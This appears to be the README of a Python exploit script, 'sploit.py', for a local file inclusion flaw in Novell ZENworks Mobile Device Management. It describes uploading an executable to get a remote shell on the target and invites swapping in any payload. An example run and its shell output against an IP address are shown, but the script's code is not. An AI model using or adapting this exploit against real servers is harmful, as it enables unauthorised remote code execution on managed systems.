This script takes advantage of a local file inclusion (lfi) tht exists in the Novell zenworks mobile device management.

The "cmd.exe" included is from win2k3 - mileage may vary on different targets. The current 'shell' is janky as hell, 
should be easy enough to replace the uploaded executable with whatever is desired :)


Example execution:  


python sploit.py http://192.168.20.133

[*] Staging exe to run
[*] Dropping to shell, type 'exit' to quit.
